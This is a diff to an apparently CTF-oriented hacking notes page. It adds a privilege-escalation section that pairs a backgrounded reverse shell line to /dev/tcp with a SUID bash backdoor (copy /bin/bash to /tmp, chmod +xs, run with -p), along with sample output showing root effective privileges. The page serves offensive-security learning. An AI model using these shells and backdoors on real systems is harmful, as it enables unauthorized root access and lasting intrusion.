@@ -197,3 +197,24 @@ Another way that might be preferable is running your Reverse Shell in a backgrou
 ```bash
 nohup bash -c 'sh -i >& /dev/tcp/127.0.0.1/1337 0>&1 &'
 ```
+
+## Privilege Escalation
+
+Often in privilege escalation, you're letting a high-privilege user execute some command. Sometimes you can't directly execute a shell as that user and have to run some other command to send a way to get a shell somewhere. One simple way is to just execute a reverse shell as that user. Then you will get a privileged reverse shell in your listener. See [#reverse-shells](hacking-linux-boxes.md#reverse-shells "mention") for some examples of this.&#x20;
+
+Another easy way if you already have access to the box, is to create a [#setuid](linux-privilege-escalation/command-triggers.md#setuid "mention") binary of bash that the target user is the owner of. The safest way to do this is to first copy /bin/bash to another location, which will make the owner of the file the user that executed the command. Then to later get back those privileges just add the SUID bit with `chmod +s` to take over the privileges of the owner when you execute the program as a low-privilege user.&#x20;
+
+{% code title="Let target execute:" %}
+```shell
+cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
+```
+{% endcode %}
+
+<pre class="language-shell-session" data-title="Low-privilege user"><code class="lang-shell-session"><strong>$ /tmp/bash -p  # -p to maintain privileges
+</strong># id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user)
+</code></pre>
+
+{% hint style="warning" %}
+**Warning**: While this shell allows filesystem access as `root`, it won't perfectly with with all commands as your main user is still `user`, we only raised their privileges. You can solve this by getting a clean shell with techniques like [#root-etc-passwd](../web/arbitrary-file-write.md#root-etc-passwd "mention").
+{% endhint %}
